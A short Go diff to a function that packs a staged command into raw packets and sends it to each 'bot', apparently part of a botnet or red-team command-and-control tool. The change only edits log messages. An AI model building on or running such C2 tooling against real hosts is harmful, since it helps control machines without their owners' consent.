@@ -29,11 +29,10 @@ func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, list
 		fd := cattails.NewSocket()
 		// Create packet
 		packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
-		fmt.Println("[+] Repsonding to:", bot)
 
 		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
-		fmt.Println("Sent reponse to:", bot.Hostname)
+		fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
 		unix.Close(fd)
 	}
 }
